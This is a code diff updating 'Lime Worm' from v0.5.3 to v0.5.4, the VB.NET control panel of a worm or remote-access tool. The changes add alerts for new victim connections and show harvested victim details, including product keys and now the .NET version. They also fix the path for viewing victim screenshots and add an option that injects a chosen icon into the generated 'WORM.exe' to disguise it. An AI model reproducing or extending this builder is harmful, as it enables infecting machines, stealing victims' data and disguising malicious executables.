@@ -1,6 +1,6 @@
 ﻿
 '##################################################################
-'##        N Y A N   C A T  |||   Updated on Apr./24/2018        ##
+'##        N Y A N   C A T  |||   Updated on Apr./28/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -19,7 +19,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                     .. Lime Worm v0.5.3 ..                   ##
+'##                     .. Lime Worm v0.5.4 ..                   ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -105,7 +105,7 @@ Public Class Form1
             End
         End Try
 
-        Me.Text = "Lime Worm v0.5.3"
+        Me.Text = "Lime Worm v0.5.4"
 
 
         EXE.Enabled = False
@@ -152,12 +152,14 @@ Public Class Form1
                         End If
                         Messages("{" + u.IP.Split(":")(0) + "}", "Connected")
                         Fix()
-                    End SyncLock
 
-                    NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
-                    NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
-                    NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
-                    NotifyIcon1.ShowBalloonTip(600)
+                        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
+                            NotifyIcon1.BalloonTipIcon = ToolTipIcon.None
+                            NotifyIcon1.BalloonTipText = "User: " + A(2) + vbNewLine + "IP: " + u.IP
+                            NotifyIcon1.BalloonTipTitle = "Lime Worm | New Connection!"
+                            NotifyIcon1.ShowBalloonTip(600)
+                        End If
+                    End SyncLock
 
                 Case "ping" ' ping
                     SyncLock L1.Items
@@ -409,6 +411,7 @@ Public Class Form1
                     n.ListView1.Items.Add(New ListViewItem("Product Key: ", GW)).SubItems.Add(A(7))
 
                     n.ListView1.Items.Add(New ListViewItem("Machine Type: ", GS)).SubItems.Add(A(17))
+                    n.ListView1.Items.Add(New ListViewItem("DotNET Framework: ", GS)).SubItems.Add(A(18))
                     n.ListView1.Items.Add(New ListViewItem("CPU Name: ", GS)).SubItems.Add(A(8))
                     n.ListView1.Items.Add(New ListViewItem("GPU Name: ", GS)).SubItems.Add(A(9))
                     n.ListView1.Items.Add(New ListViewItem("RAM: ", GS)).SubItems.Add(A(10))
@@ -589,7 +592,7 @@ Public Class Form1
         Try
             If L1.SelectedItems.Count > 0 Then
                 For Each x As ListViewItem In L1.SelectedItems
-                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(2).Text + "_" + x.SubItems(0).Text + "\" + "SC.jpeg"
+                    PictureBox1.ImageLocation = "Users" + "\" + x.SubItems(3).Text + "_" + x.SubItems(2).Text + "\" + "SC.jpeg"
                     PictureBox1.Visible = True
                 Next
             Else
@@ -668,6 +671,7 @@ Public Class Form1
         L1.Sort()
         Fix()
     End Sub
+
 
     Public Class MyRenderer
         Inherits ToolStripProfessionalRenderer
@@ -937,6 +941,9 @@ Public Class Form1
                     Next
 
                     definition.Write(Application.StartupPath + "\" + "WORM.exe")
+                    If Icon_OFF.Checked = True AndAlso Icon_Box.ImageLocation <> "" Then
+                        Iconchanger.InjectIcon(Application.StartupPath + "\" + "WORM.exe", Icon_Box.ImageLocation)
+                    End If
                     MsgBox("Your Worm Has been Created Successfully", vbInformation, "DONE!")
                     My.Settings.Save()
                 Catch ex1 As Exception
@@ -978,6 +985,35 @@ Public Class Form1
             MsgBox(ex.Message, MsgBoxStyle.Critical)
         End Try
     End Sub
+
+    Private Sub Icon_Box_Click(sender As Object, e As EventArgs) Handles Icon_Box.Click
+        If Icon_OFF.Checked = True Then
+            Dim o As New OpenFileDialog
+            With o
+                .Filter = "*.ico (*.ico)| *.ico"
+                .InitialDirectory = Application.StartupPath + "\Icons"
+                .Title = "Select Icon"
+            End With
+
+            If o.ShowDialog = Windows.Forms.DialogResult.OK Then
+                Icon_Box.ImageLocation = o.FileName
+            Else
+                Icon_OFF.Checked = False
+            End If
+
+        End If
+    End Sub
+
+    Private Sub ToolStripStatusLabel2_Click(sender As Object, e As EventArgs) Handles ToolStripStatusLabel2.Click
+        If ToolStripStatusLabel2.Text = ("       NOTIFICATION [ON]") Then
+            ToolStripStatusLabel2.Text = "       NOTIFICATION [OFF]"
+            ToolStripStatusLabel2.ForeColor = Color.Red
+        Else
+            ToolStripStatusLabel2.Text = "       NOTIFICATION [ON]"
+            ToolStripStatusLabel2.ForeColor = Color.Lime
+        End If
+    End Sub
+
 
 
 #End Region
